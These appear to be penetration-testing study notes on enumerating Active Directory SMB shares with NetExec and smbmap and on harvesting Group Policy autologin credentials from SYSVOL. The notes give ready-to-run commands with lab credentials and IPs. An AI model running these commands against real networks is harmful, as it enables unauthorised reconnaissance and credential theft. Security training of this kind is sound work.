# 01.25 SMB Share Enumeration

> Enumerate authenticated shares with CME `spider_plus` and hunt GPP cpasswords + autologin creds in SYSVOL.

## Overview

Authenticated share enumeration with CME and smbmap. spider_plus recursively lists share contents to JSON. GPP autologin and password modules find cleartext credentials in SYSVOL.

## Steps

- **--users / --groups / --shares** — standard CME flags.
- **spider_plus** — dumps full share file tree to JSON.
- **smbmap -R** — recursive listing with read/write markers.
- **-M gpp_autologin** — finds Autologon credentials in GPP.

## Commands

### CME share enum

```bash
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups
sudo nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

### smbmap recursive

```bash
smbmap -u forend -p Klmcargo2 -d <DOMAIN>.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d <DOMAIN>.LOCAL -H 172.16.5.5 -R 'Department Shares'
```

### GPP credential modules

```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```
